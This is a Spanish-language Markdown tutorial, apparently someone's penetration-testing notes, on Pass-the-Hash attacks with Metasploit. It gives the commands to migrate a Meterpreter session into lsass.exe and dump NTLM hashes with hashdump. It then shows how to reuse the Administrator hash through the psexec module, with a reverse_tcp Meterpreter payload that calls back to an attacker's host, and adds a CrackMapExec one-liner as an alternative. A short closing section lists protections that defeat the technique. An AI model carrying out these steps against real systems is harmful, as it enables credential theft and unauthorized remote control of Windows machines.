# Pass-the-Hash con PSExec en Metasploit

## ¿Qué es Pass-the-Hash?

Pass-the-Hash (PtH) es una técnica que permite autenticarte en un sistema Windows sin conocer la contraseña en texto claro, utilizando directamente el **hash NTLM** de la contraseña.

---

## Requisitos

- Acceso a una **sesión Meterpreter** en la máquina víctima.
- Privilegios administrativos en la sesión.
- El sistema objetivo debe **permitir autenticación SMB con NTLM**.

---

## Pasos para ejecutar Pass-the-Hash con PSExec

### 1. Obtener sesión Meterpreter

Tener una sesión activa en una máquina víctima.

---

### 2. Migrar a `lsass.exe` para obtener los hashes

```bash
ps
pgrep lsass
migrate <PID>
```

Esto te permite acceder a la memoria del proceso `lsass`, donde residen los hashes de los usuarios.

---

### 3. Verificar arquitectura del sistema

```bash
sysinfo
```

Esto es importante para identificar si los exploits o payloads deben ser `x86` o `x64`.

---

### 4. Volcar los hashes

```bash
hashdump
```

Obtendrás líneas como:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:...
```

Copia el hash de la cuenta `Administrator`.

---

### 5. Salir de la sesión Meterpreter

```bash
exit
```

---

### 6. Usar módulo `psexec` en Metasploit Framework

```bash
use exploit/windows/smb/psexec
```

---

### 7. Configurar los parámetros del exploit

```bash
set RHOSTS <IP de la víctima>
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP del atacante>
set LPORT <puerto>
run
```

Asegúrate de incluir el hash **en formato LM:NTLM**, aunque el LM esté vacío (`aad3b435b51404eeaad3b435b51404ee`).

---

## ¿Cuándo funciona Pass-the-Hash?

- Cuando el sistema remoto **acepta NTLM como método de autenticación** (por defecto en muchas versiones de Windows).
- El usuario cuyo hash tienes **tiene permisos administrativos** sobre el objetivo.
- El sistema **no tiene protecciones modernas como SMB signing obligatorio o credenciales protegidas**.

---

## Casos comunes donde no funciona

- **CredSSP, SMB Signing** o **Restricciones de NTLM** deshabilitan el acceso.
- El hash pertenece a un **usuario sin permisos suficientes**.
- El sistema tiene habilitadas medidas como **LSA Protection** o configuraciones avanzadas de seguridad.

---

## Alternativas si falla

- Usar el hash con **CrackMapExec**:
  ```bash
  crackmapexec smb <IP> -u Administrator -H <NTLM_HASH>
  ```

